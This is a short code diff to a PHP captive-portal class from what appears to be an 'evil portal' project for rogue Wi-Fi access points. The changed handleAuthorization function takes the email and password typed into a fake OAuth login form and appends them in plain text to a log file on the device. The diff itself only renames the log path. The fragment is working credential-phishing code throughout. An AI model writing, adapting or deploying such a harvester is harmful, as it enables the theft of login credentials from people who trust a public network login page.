@@ -6,13 +6,12 @@ class MyPortal extends Portal
     public function handleAuthorization()
     {
 
-      if (!is_dir('/sd/oauth-login/')) {
-        // dir doesn't exist, make it
-        mkdir('/sd/oauth-login/');
+      if (!is_dir('/sd/evilportal-data/oauth-login/')) {
+        mkdir('/sd/evilportal-data/oauth-login/');
       }
 
       if (isset($_POST['email'])) {
-        file_put_contents("/sd/oauth-login/data.txt", $_POST['email'] . ' : ' . $_POST['pass'] . "\n", FILE_APPEND);
+        file_put_contents("/sd/evilportal-data/oauth-login/logs.txt", $_POST['email'] . ' : ' . $_POST['pass'] . "\n", FILE_APPEND);
       }
 
         // Call parent to handle basic authorization first
